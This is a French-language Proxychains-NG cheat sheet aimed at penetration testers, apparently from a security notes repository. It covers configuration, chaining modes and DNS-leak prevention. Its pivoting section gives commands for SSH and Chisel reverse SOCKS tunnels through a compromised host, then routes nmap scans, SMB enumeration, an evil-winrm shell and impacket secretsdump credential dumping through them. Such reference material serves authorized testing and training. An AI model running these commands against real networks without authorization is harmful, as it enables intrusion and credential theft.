<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p align="center">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivotement et tunneling">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protocoles">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licence GPLv2">
</p>

<p align="center">
  <b>🌐 Acheminez dynamiquement les outils réseau CLI Linux standard via des proxys SOCKS et HTTP multi-sauts via LD_PRELOAD</b>
</p>

---

## 📋 Table des matières

- [Présentation et fonctionnement des proxychains](#-overview--how-proxychains-works)
- [Installation](#-installation)
- [Fichiers de configuration et hiérarchie de recherche](#-configuration-files--lookup-hierarchy)
- [Modes de chaînage expliqués](#-chaining-modes-explained)
  - [`dynamic_chain` (Recommandé)](#dynamic_chain-recommandé)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [Prévention des fuites DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Configuration des listes de proxy](#-configuring-proxy-lists)
- [Workflows pivotants](#-pivoting-workflows)
  - [Proxy SSH Dynamic SOCKS (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Relais Chisel & Ligolo-ng SOCKS](#chisel--ligolo-ng-socks-relay)
- [Intégration d'outils et pièges](#-tool-integration--pièges)
  - [Nmap avec Proxychains (Pourquoi `-sS` échoue)](#nmap-with-proxychains-why--ss-fails)
  - [Outils Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et OPSEC](#-defensive-considérations--opsec)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et fonctionnement des proxychains

**Proxychains** (fork actif moderne : **Proxychains-NG** / `proxychains4`) permet d'exécuter n'importe quelle commande dynamique via un ou plusieurs proxys SOCKS4, SOCKS5 ou HTTP(S) chaînés.

Il fonctionne en préchargeant une bibliothèque de hooks personnalisée (`libproxychains4.so`) à l'aide du mécanisme de liaison dynamique (`LD_PRELOAD`). Cela intercepte les appels API socket (`connect()`, `gethostbyname()`) effectués par les applications cibles et redirige de manière transparente leur trafic TCP vers la chaîne proxy configurée.

---

## 📥Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Fichiers de configuration et hiérarchie de recherche

Proxychains recherche son fichier de configuration dans l'ordre de priorité strict suivant :

1. Chemin défini dans la variable d'environnement `PROXYCHAINS_CONF_FILE`.
2. Fichier passé via le flag `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` dans le répertoire de travail actuel.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (système par défaut).

---

## 🔗 Modes de chaînage expliqués

Modifiez `/etc/proxychains4.conf` pour choisir l'algorithme de routage en chaîne :

### `dynamic_chain` (recommandé)
Ignore automatiquement les proxys morts dans la liste sans interrompre la connexion. Si le proxy n°1 est actif, le proxy n°2 est inactif et le proxy n°3 est actif, le trafic passe par 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Suit strictement l’ordre du proxy configuré. Si un proxy de la chaîne tombe en panne ou expire, la connexion entière est refusée.
```ini
strict_chain
```
### `round_robin_chain`
Parcourt la liste de proxy de manière séquentielle pour chaque nouvelle demande de connexion.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Sélectionne aléatoirement les proxys dans la liste jusqu'à `chain_len`.

---

## 🛡️ Prévention des fuites DNS (`proxy_dns`)

L'une des défaillances OPSEC les plus dangereuses lors d'une reconnaissance externe ou d'un pivotement interne est la fuite de requêtes DNS vers le FAI local ou la passerelle cible.

Assurez-vous que `proxy_dns` est actif dans `/etc/proxychains4.conf` :
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Configuration des listes de proxy

Au bas de `/etc/proxychains4.conf`, sous `[ProxyList]` :
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Workflows pivotants

### Proxy SSH dynamique SOCKS (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Relais SOCKS Burin & Ligolo-ng

Lors de l'exécution de tunnels client-serveur Chisel :
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Intégration d'outils et pièges

### Nmap avec Proxychains (Pourquoi `-sS` échoue)

> [!AVERTISSEMENT]
> Les proxys SOCKS ne prennent en charge que les sessions TCP établies. **Les analyses SYN Stealth (`-sS`) échoueront ou se bloqueront** car elles nécessitent une manipulation brute de socket non prise en charge sur SOCKS !
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Outils Active Directory (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Exécuter la commande via proxy** | `proxychains4 <command> [args]` |
| **Fichier de configuration personnalisé** | `proxychains4 -f ./custom.conf <command>` |
| **Exécution silencieuse (pas de bannière)** | `proxychains4 -q <command>` |
| **Cible interne de l'analyse TCP** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Demande Web interne** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Test SQLMap interne** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Sonde NetExec interne** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Considérations défensives et OPSEC

1. **Fuites DNS :** Si `proxy_dns` est commenté, votre système résoudra les noms d'hôte via le DNS local, alertant les Blue Teams des noms d'hôte ciblés.
2. **Vitesse et latence :** Le chaînage de plusieurs proxys compose le temps d'aller-retour (RTT). Définissez des délais d'attente raisonnables (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Binaires statiques :** Les binaires compilés statiquement (par exemple, les binaires Go/Rust qui ne lient pas `libc.so`) contournent les hooks `LD_PRELOAD` et ne seront pas acheminés via les chaînes proxy.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Cette aide-mémoire est destinée uniquement aux tests d'intrusion autorisés, aux engagements de l'équipe rouge et à la recherche pédagogique. L'acheminement du trafic sans autorisation est strictement interdit.